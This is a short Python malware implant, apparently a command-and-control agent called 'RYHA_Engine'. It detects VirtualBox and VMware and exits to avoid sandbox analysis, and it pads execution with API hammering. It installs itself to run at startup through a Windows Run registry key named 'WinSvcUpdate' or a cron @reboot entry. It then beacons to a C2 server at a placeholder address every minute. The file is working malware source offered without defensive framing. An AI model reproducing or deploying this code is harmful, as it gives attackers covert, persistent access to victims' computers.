import os, sys, time, threading, platform, subprocess, socket, requests, json, base64

C2_URL = "http://YOUR_SERVER_IP:5000"

class RYHA_Engine:
    def __init__(self):
        self.id = f"GHOST-{socket.gethostname()}"
        self.os = platform.system()

    def apply_stealth(self):
        """Kills process if VM or Sandbox detected."""
        if any(x in platform.uname().version.upper() for x in ["VBOX", "VMWARE"]):
            os._exit(0)
        # API Hammering (Evasion)
        for _ in range(100000): _ = os.getpid()

    def anchor_persistence(self):
        path = os.path.realpath(sys.argv[0])
        if self.os == "Windows":
            cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinSvcUpdate" /t REG_SZ /d "{path}" /f'
            subprocess.run(cmd, shell=True, capture_output=True)
        else:
            os.system(f'(crontab -l ; echo "@reboot {path}") | crontab -')

    def run_beacon(self):
        while True:
            try:
                requests.post(f"{C2_URL}/ping", json={"id": self.id, "status": "ALIVE"})
            except: pass
            time.sleep(60)

if __name__ == "__main__":
    ghost = RYHA_Engine()
    ghost.apply_stealth()
    ghost.anchor_persistence()
    threading.Thread(target=ghost.run_beacon, daemon=True).start()
    while True: time.sleep(10)